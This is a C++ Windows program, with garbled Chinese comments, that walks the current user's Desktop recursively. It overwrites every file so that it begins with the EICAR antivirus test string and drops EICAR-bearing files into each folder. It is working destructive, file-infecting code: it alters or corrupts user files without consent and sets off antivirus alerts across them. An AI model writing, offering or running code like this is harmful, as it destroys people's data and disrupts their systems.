#include <iostream>
#include <fstream>
#include <filesystem>
#include <string>
#include <Windows.h>

namespace fs = std::filesystem;

void ProcessFolder(const fs::path& folderPath)
{
    for (const auto& entry : fs::recursive_directory_iterator(folderPath))
    {
        if (fs::is_regular_file(entry))
        {
            std::ifstream inputFile(entry.path());
            std::string content((std::istreambuf_iterator<char>(inputFile)), std::istreambuf_iterator<char>());
            if (content.find("X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*") != 0)
            {
                std::string newText = "X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*" + content;
                std::ofstream outputFile(entry.path());
                outputFile << newText;
            }
        }
        else if (fs::is_directory(entry))
        {
            std::string filePath = entry.path().string() + "empty_folder.txt";
            std::ofstream emptyFile(filePath);
            emptyFile << "X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*";
        }
    }
}

int main()
{
    char username[MAX_PATH]; // ʹ�� MAX_PATH ���� UNLEN
    DWORD usernameLength = MAX_PATH;

    if (GetUserNameA(username, &usernameLength))
    {
        std::string path = "C:\\Users\\" + std::string(username) + "\\Desktop";
        fs::path folderPath(path);
        if (fs::is_directory(folderPath))
        {
            ProcessFolder(folderPath);
            std::cout << "�Ѵ����ļ���: " << folderPath << std::endl;
        }
        else
            std::cout << "��Ч���ļ���·����������." << std::endl;
    }
    system("pause");
    return 0;
}
